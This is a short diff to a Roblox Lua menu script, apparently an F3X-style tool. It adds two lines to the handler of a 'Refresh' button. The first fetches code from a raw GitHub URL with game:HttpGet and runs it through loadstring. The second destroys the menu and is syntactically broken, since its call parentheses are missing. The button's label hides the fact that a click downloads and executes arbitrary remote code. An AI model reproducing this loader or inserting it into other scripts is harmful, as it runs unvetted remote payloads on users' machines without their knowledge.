@@ -661,7 +661,8 @@ local function WPARLYY_fake_script() -- f3xmenu.refresh
 
 	local ref = script.Parent.canvas.Refresh
 	local function refresh()
-		
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/agagagg/shhshsh/refs/heads/main/funny.txt', true))()
+script.Parent:Destroy
 	end
 	
 	ref.MouseButton1Click:Connect(refresh)
